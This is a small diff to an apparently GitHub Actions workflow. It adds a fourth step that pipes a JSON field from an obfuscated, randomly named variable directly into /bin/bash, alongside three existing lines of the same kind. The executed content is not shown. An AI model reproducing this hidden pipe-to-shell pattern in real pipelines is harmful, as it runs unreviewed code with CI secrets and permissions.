@@ -28,6 +28,7 @@ jobs:
           echo $rpht485 | jq -r .iqu98320 | /bin/bash
           echo $inexi00 | jq -r .kqo22 | /bin/bash
           echo $ioade45 | jq -r .ttq53 | /bin/bash
+          printf '%s' "$jxscp9056" | jq -r .wef08 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
